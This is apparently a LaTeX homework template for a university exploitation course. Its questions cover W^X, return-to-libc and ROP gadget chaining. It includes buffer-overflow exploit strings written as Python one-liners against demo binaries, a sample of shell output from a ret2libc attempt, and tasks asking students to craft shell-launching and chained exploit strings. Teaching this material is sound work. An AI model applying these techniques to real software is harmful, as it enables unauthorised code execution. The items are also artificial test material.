\documentclass{article}[9pt]

\usepackage{listings}
\usepackage{fullpage}
\usepackage{textcomp}
\usepackage{mdframed}

\lstset{ %
  basicstyle=\ttfamily\small,
  commentstyle=\ttfamily\small\emph,
  upquote=true,
  framerule=1.25pt,
  breaklines=true,
  showstringspaces=false,
  escapeinside={(*@}{@*)},
  belowskip=2em,
  aboveskip=1em,
}


\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}


%%%%%%%%%%%%%%%%%%%%%%%%%%
% To add an answer, use the myanswer environment command under \item heading,like
%
% \item What is the meaning of life, universe, everything?
% \begin{mysanswer}
%   The answer is 42!
% \end{myanswer}
%
% You can also use macro's in your \myanswer if you want to control the
% formatting. Such as verbatim enviroment or lstlisting environment.
%
% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
% so make sure your home work is well formatted.
%%%%%%%%%%%%%%%%%%%%%%%%%%%

\title{SI485h: HW 08}
\date{FILL IN THE DUE DATE}
\author{FILL IN YOUR NAME}

\begin{document}

\maketitle
\section*{Instructions}

\begin{itemize}
\item You must submit your homework using this Latex template.

\item This homework is graded out of 70 points. Point values are associated to each question.
\end{itemize}

\section*{Questions}
\label{sec:orgfb6c6bf}

\begin{enumerate}
\item (5 points) Explain the principle of w-⊗-x as a way to protect against stack
smashing attacks that load shell code.

\item (5 points) What \texttt{gcc} compilation is used to \textbf{tunr off} w-xor-x?

\item (5 points) What is a return-to-libc attack?

\item (5 points) What c-library function is typically called when performing a
return-to-libc attack? Why do we choose this one?

\item (5 points) Explain the \textbf{error} output and how we know that this was a successful exploit.

\begin{verbatim}
user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\x90\xa1\xe5\xb7'"`
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
Segmentation fault (core dumped)
\end{verbatim}

\item (10 points) Draw the stack diagram for the function below after ret2libc
attack is executed properly. Use the diagram to explain how you
control the argument in a ret2libc attack.

\begin{verbatim}
void vuln(int i, char * s){

  char buf[20];
  strcpy(buf,s);

  while(i-- > 0)
    printf("%d: %s\n",i,buf);

  return;
}
\end{verbatim}

\item (5 points) Suppose you're exploiting the function below. You know that the
value of \texttt{s} is 0xbfff625. Provide an exploit string for a
re2libc attack that will launch a shell.

\begin{verbatim}
void vuln(char * s){

  char buf[20];
  strcpy(buf,s);

  while(i-- > 0)
    printf("%d: %s\n",i,buf);

  return;
}
\end{verbatim}

\item (5 point) If the function bad() is at address 0x0804847d and the address of
good() is at address 0x0804852a, what order of functions results
from the exploit string:

\begin{verbatim}
./prog `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08' + '\x2a\x85\x04\x08' + '\x2a\x85\x04\x08' + '\x7d\x84\x04\x08'"`
\end{verbatim}

\item (5 point) Consider that the function bad() is defined as following:

\begin{verbatim}
void bad(int a){printf("%#08x\n",a);}     
\end{verbatim}

and good() is defined as following

\begin{verbatim}
void good(){printf("Go Navy!\n");}     
\end{verbatim}

What is the output given the exploit string if good() and bad()
is at the same location as before?

\begin{verbatim}
./prog `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08' + '\x2a\x85\x04\x08' + '\xbe\xba\xfe\xca' + '\xef\xbe\xad\xde'"`
\end{verbatim}

\item (5 point) Consider that the function bad() is defined as following:
\begin{verbatim}
void bad(int a, int b){printf("%#08x %#08x\n",a,b);}      
\end{verbatim}

And good() is defined the same as before, what will the output of the program be?

\begin{verbatim}
./prog `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08' + '\x2a\x85\x04\x08' + '\xbe\xba\xfe\xca' + '\xef\xbe\xad\xde'"`      
\end{verbatim}

\item (5 points) Given the definition of \texttt{bad(int a, int b)} and \texttt{good()} from
above, why can we not create a exploit string where we call
\texttt{bad(0xcafebabe,0xdeadbeef)} then \texttt{good()} and then \texttt{bad()} again
such that this time \texttt{bad(0xbadf00d,0xfeed3e3e)} is called?

\item (5 points) If we were to write an exploit string to do the sequence of
function calls as desired above (ie, \texttt{bad(0xcafebabe)},
\texttt{good(0xdeadbeef)}, then \texttt{bad(0xbadf00d,0xfeed3e3e)}): What
gadget would we need?

\item (5 points) Assuming the gadget was at memory address \texttt{0x080485a9},complete
the exploit string to do the desired sequence of function calls.
\end{enumerate}
\end{document}